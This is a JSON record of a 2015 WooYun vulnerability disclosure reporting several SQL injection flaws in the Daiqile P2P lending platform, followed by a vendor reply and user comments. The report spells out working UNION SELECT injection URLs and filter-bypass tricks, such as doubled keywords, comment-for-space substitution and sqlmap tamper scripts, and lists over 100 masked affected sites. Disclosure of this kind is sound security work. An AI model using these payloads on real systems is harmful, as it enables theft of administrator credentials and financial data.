{"id": 66824, "wybug_id": "wooyun-2015-0132043", "wybug_title": "贷齐乐系统多处SQL注入漏洞可影响大量P2P网贷站点(附100+案例)", "wybug_corp": "chinaanhe.com", "wybug_author": "路人甲", "wybug_date": "2015-08-08 08:51", "wybug_open_date": "2015-11-06 16:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向公众公开  简要描述： 现在全国百分之七十以上的借贷网站都是用贷齐乐系统搭建的 详细说明：  产品：贷齐乐系统厂商：http://www.chinaanhe.com/ 网贷系统|网贷系统开发|p2p借贷系统源码-宁波贷齐乐网络科技有限公司　宁波贷齐乐网络科技有限公司是一家专业从事P2P网络借贷平台开发的战略性电子商务有限公司，坐落于美丽港湾-宁波（南部商务区），在国内是最领先的P2P在线借贷平台开发供应商之一，提供在线智能融资的电子商务P2P平台。贷齐乐经过多年研发的P2P网络贷款中介系统，已经成功帮助多个平台顺利上线运营，且在数月之内冲值金额达到数千万元。特别成功月交易量1000万以上的平台有400多家，正在施工建设的有50来家。　　SQL注入点其实是很多的，但是也有WAF，都是一些比较简单的WAF可以直接绕过去，可以直接注出管理员账户密码，但是这里我还不清楚字段和表是什么。下面注入点有一些需要禁用Javascript才能正常测试，否则提示登录，我们来简单的做测试。第一处SQL注入：\n/plugins/?q=area&area_id=1  area_id存在注入；站点百分百存在该注入，这个注入最有用了\n以官方demo来看，这个注入点是存在过滤的，而且各种不同的站点还有不同的过滤方法，有些站点甚至根本没有过滤~\n\n的确是存在注入，但是过滤了select之类的；可以双写select来绕过WAF。\nhttp://121.40.166.230:10021/plugins/?q=area&area_id=-1 union selselectect 1,current_user,3,4,5,6%23\n\n\n再看某个站点居然没有过滤select只过滤了空格，可以用/**/绕过\n\nSQLMAP加上tamper轻松自然的注入啊！\n\n第二处SQL：\n/bbs/main.html?q=reply&action=quote&tid=48/**/and/**/0/**/UNION/**/SELECT/**/1,2,3,4,5,current_user,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30  99%的站点存在该注入漏洞\n以官方demo来看这个注入，虽然的确过滤了空格，而且在输出的时候没有进行解码，另外似乎也过滤了括号，但是支持union不影响我们可以读取到管理员的信息啊。\n\n试试其它的站点也是依然存在的，\n\n\n\n第三处SQL注入：\n/bbs/main.html?q=reply&action=reply&tid=1/**/and/**/0/**/UNION/**/SELECT/**/1,2,3,4,5,current_user,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30&f=1 和上门一样action方法不一样而已\n\n\nhttps的案例测试：\n\n第四处SQL注入：\n/creditshop/main.html?classid=1/**/and/**/0/**/UNION/**/SELECT/**/1,2,3,current_user,5,6,7,8,9,10,11 classid也存在注入过滤但不影响读取管理员或者其它信息\n\n\n第五处SQL注入：\n/creditshop/product/main.html?id=1/**/and/**/0/**/UNION/**/SELECT/**/1,2,3,current_user,5,6,7,8,9,10,11\n\n\n其实还有一些注入需要截断的，但以本人的技术还没办法绕过这些WAF，但也必须提出来一下~求各位大牛绕过。以下部分需要登录。第六处：\nhttp://121.40.166.230:10021/?ask&status=%273 求截断\n\n\n第七处：\nhttp://121.40.166.230:10021/index.php?user&q=code/borrow/gathering&status=0'&page=  需要登录，求截断\n\n\n第八处：\nhttp://121.40.166.230:10021/creditshop/main.html?classid=&price=0,1000'&order= price存在注入，求截断以及绕过长度限制\n\n\n不多说了。   漏洞证明：  给案例加点马赛克保护资金吧、可以看到还有大量https的站点，危害可想而知官方demo：http://121.40.166.230:10021/\n\nmask 区域\n1.http://**.**.**/plugins/q=area&area_id=-1%27_2.http://**.**.**/plugins/q=area&area_id=-1%27_3.http://**.**.**/plugins/q=area&area_id=-1%27_4.http://**.**.**/plugins/q=area&area_id=-1%27_5.http://**.**.**/plugins/q=area&area_id=-1%27_6.http://**.**.**/plugins/q=area&area_id=-1%27_7.http://**.**.**//plugins/q=area&area_id=-1%27_8.http://**.**.**/plugins/q=area&area_id=-1%27_9.http://**.**.**/plugins/q=area&area_id=-1%27_10.http://**.**.**//plugins/q=area&area_id=-1%27_11.http://**.**.**/plugins/q=area&area_id=-1%27_12.http://**.**.**/plugins/q=area&area_id=-1%27_13.http://**.**.**//plugins/q=area&area_id=-1%27_14.http://**.**.**/plugins/q=area&area_id=-1%27_15.http://**.**.**/plugins/q=area&area_id=-1%27_16.http://**.**.**/plugins/q=area&area_id=-1%27_17.http://**.**.**/plugins/q=area&area_id=-1%27_18.http://**.**.**/plugins/q=area&area_id=-1%27_19.http://**.**.**//plugins/q=area&area_id=-1%27 _20.https://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_21.https://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_22.https://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_23.https://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_24.https://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_25.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_26.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_27.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_28.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_29.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_30.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_31.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_32.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_33.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_34.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_35.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_36.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_37.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_38.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_39.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_40.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_41.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_42.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_43.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_44.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_45.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_46.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_47.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_48.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_49.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_50.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_51.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_52.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_53.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_54.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_55.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_56.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_57.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_58.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_59.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_60.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_61.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_62.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_63.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_64.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_65.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_66.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_67.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_68.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_69.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_70.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_71.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_72.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_73.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_74.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_75.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_76.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_77.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_78.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_79.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_80.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_81.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_82.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_83.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_84.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_85.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_86.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_87.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_88.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_89.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_90.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_91.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_92.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_93.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_94.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_95.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_96.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_97.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_98.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_99.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_100.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_101.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_102.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_103.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_104.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_105.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_106.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_107.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_108.http://**.**.**//bbs/main.htmlq=reply&action=quote&tid=%2748_109.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748_110.http://**.**.**/bbs/main.htmlq=reply&action=quote&tid=%2748\n\n   修复方案：  通知厂商修复就是了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-08 16:10 厂商回复： 非常感觉，我们极其注重安全，会及时处理的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-06 11:31 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 哈！躁起来！)\t\t \n  NB吖    \n     2015-08-06 14:56 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1072 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  某网贷通用系统SQL注入，可影响100多家P2P公司。。    \n     2015-08-06 15:38 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  look这篇文章，http://gb.cri.cn/44571/2015/08/03/7872s5052907.htm，最安全P2P网贷系统“花落贷齐乐”    \n     2015-08-06 16:07 |    \t\t毛豆豆 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我是毛豆豆，老爱冒痘痘)\t\t \n  这个洞要火    \n     2015-08-07 12:49 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB.    \n     2015-08-07 15:52 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  我擦，我也随便测下就发现个sql漏洞    \n     2015-08-07 16:44 |    \t\tMarsevil \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 比鬼神更可怕的，是人心)\t\t \n  0.0 好吧，捂了大半年的漏洞终于被人公布了，，，    \n     2015-08-08 16:44 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1072 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  8分 看不出来你们重视安全。 呵呵。    \n     2015-08-08 21:32 |    \t\tkv2 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 技术的精纯以及无私的奉献是我们至高无上的...)\t\t \n  这才8分？？    \n     2015-08-09 15:15 |    \t\t小菜虫 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        )\t\t \n  非常感觉是一种什么样的感觉    \n     2015-08-11 18:46 |    \t\t我是你的益达！ \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 容我喝壹杯捌贰年的雪碧压压精！！)\t\t \n  非常重视给个Rank 8么    \n     2015-08-11 22:31 |    \t\t佳佳佳佳佳 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | I want to be ur sunshine.)\t\t \n  突然想起一个词  叫做十动然拒    \n     2015-08-13 08:34 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | 呵呵)\t\t \n  这个洞非常严重，那我就给你8rank吧！    \n     2015-08-13 13:50 |    \t\tsOnsec \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:27        | 安全是什么...)\t\t \n  不划算 - -    \n     2015-08-21 00:46 |    \t\txiaohao \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我要去找到那力量，让所有的生命都超越界限...)\t\t \n  去年的时候，人手一堆网贷系统的洞。后面好多网贷平台都跑去自己开发了。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}